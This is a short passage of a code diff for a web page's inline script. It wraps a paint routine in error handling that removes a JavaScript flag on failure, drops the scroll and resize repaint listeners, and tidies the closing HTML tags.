+    paint();
+  } catch (err) {
+    delete root.dataset.js;
   }
-  addEventListener('scroll', function () {
-    if (!tick) { tick = true; requestAnimationFrame(paint); }
-  }, { passive: true });
-  addEventListener('resize', paint);
-  paint();
 })();
-</script>  </body></html>
+</script> </body> </html>
